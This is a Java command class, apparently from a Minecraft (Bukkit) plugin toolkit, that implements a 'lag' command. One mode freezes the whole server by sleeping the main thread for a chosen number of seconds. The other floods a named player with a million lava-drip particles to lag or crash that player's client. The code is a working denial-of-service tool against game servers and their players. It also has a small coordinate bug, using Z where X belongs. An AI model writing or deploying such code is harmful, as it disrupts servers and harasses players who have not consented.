package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.Utilities;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.Particle;
import org.bukkit.entity.Player;

import java.util.concurrent.TimeUnit;

public class Lag implements Command {
    @Override
    public String[] getCommands() {
        return new String[]{"lag"};
    }

    @Override
    public String getDescription() {
        return "Lag a player or the server.";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        String[] args = context.getArgs();
        if (args.length == 0) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "lag <seconds to lag server> | lag <player> (amount of particles)");
            return;
        }

        Player player = Bukkit.getPlayer(args[0]);
        if (player == null) {
            int seconds;
            try {
                seconds = Integer.parseInt(args[0]);
            } catch (Exception e) {
                sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
                return;
            }

            Bukkit.getScheduler().scheduleSyncDelayedTask(context.getZ_(), () -> {
                sender.sendMessage(Colors.Prefix + Colors.Success + "Attempting to lag server for " + seconds + " seconds.");
                try {
                    TimeUnit.SECONDS.sleep(seconds);
                } catch (InterruptedException e) {
                    sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
                }
            });

            return;
        }

        if (!Utilities.isNewApi()) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "This command is only available on 1.13+.");
            return;
        }

        int particles = 1000000;
        if (args.length > 1) {
            try {
                particles = Integer.parseInt(args[1]);
            } catch (Exception e) {
                sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
                return;
            }
        }

        int finalParticles = particles;
        Bukkit.getScheduler().scheduleSyncDelayedTask(context.getZ_(), () -> {
            Location location = new Location(player.getWorld(), player.getLocation().getZ(), player.getLocation().getY() + 10, player.getLocation().getZ());
            player.spawnParticle(Particle.DRIP_LAVA, location, finalParticles);

            sender.sendMessage(Colors.Prefix + Colors.Success + "Successfully sent " + finalParticles + " particles to lag " + player.getName() + "!");
        });
    }
}
